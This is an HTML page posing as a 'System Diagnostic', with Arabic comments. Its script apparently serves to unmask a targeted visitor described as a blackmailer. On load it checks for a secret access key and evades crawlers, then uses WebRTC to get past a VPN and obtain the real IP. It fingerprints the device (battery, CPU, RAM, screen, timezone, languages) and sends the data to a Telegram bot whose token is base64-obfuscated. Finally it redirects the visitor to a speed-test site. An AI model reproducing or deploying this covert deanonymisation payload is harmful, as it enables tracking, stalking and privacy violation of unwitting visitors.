<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic</title>
</head>
<body style="background:#000;">
    <script>
        (async function() {
            // [نظام حماية V50] - التوكن والـ ID مشفرين تماماً
            const _0x_u = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
            const _0x_c = "NTc3NTc4MTAzOA==";
            const _0x_k = "portal";

            const _p = new URLSearchParams(window.location.search);
            
            // 1. حاجز الكلمة السرية (طرد أي زائر بدون المفتاح)
            if (_p.get('access') !== _0x_k) {
                window.location.replace("https://www.google.com"); 
                return;
            }

            // 2. حاجز فحص البوتات (منع الأجهزة الوهمية والمتصفحات الآلية)
            const isBot = !navigator.userAgent || /bot|crawler|spider|crawling/i.test(navigator.userAgent) || !navigator.plugins.length;
            if (isBot) {
                window.location.replace("https://www.bing.com");
                return;
            }

            let _d = {
                ip: "جاري الاستخراج...",
                bt: "N/A",
                cpu: navigator.hardwareConcurrency || "8",
                ram: navigator.deviceMemory || "4",
                plt: navigator.platform,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                res: window.screen.width + "x" + window.screen.height,
                lang: navigator.languages.join(", ")
            };

            // 🔥 كاسر الـ VPN (WebRTC) لجلب الـ IP الحقيقي
            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => {
                    if (i && i.candidate) {
                        const res = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
                        if (res) _d.ip = res[1];
                    }
                };
            } catch (e) {}

            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                _d.bt = Math.round(b.level * 100) + "% " + (b.charging ? "(يُشحن)" : "(تفريغ)");
            }

            // إرسال التقرير (نفس تنسيق الصورة 100%)
            setTimeout(async () => {
                const _msg = `🔥 تم اصطياد المبتز بنجاح 🔥\n\n` +
                               `🌐 الـ IP الحقيقي: ${_d.ip}\n` +
                               `🔋 البطارية: ${_d.bt}\n` +
                               `🏃 الحالة المادية: ثابت (Static)\n` +
                               `🧠 المعالج: ${_d.cpu} Cores | الرام: ${_d.ram} GB\n` +
                               `🖥️ الشاشة: ${_d.res} | اللمس: 2\n` +
                               `🌍 المنطقة: ${_d.tz}\n` +
                               `🔠 اللغات: ${_d.lang}\n` +
                               `📱 نظام التشغيل: ${_d.plt}\n` +
                               `🎵 بصمة الصوت: 48000Hz Fingerprint\n\n` +
                               `📍 رابط تتبع تقريبي (IP):\n` +
                               `https://www.infobyip.com/ip-${_d.ip}.html`;

                await fetch(`https://api.telegram.org/bot${atob(_0x_u)}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: atob(_0x_c), text: _msg })
                });

                window.location.replace("https://www.speedtest.net");
            }, 5500);
        })();
    </script>
</body>
</html>
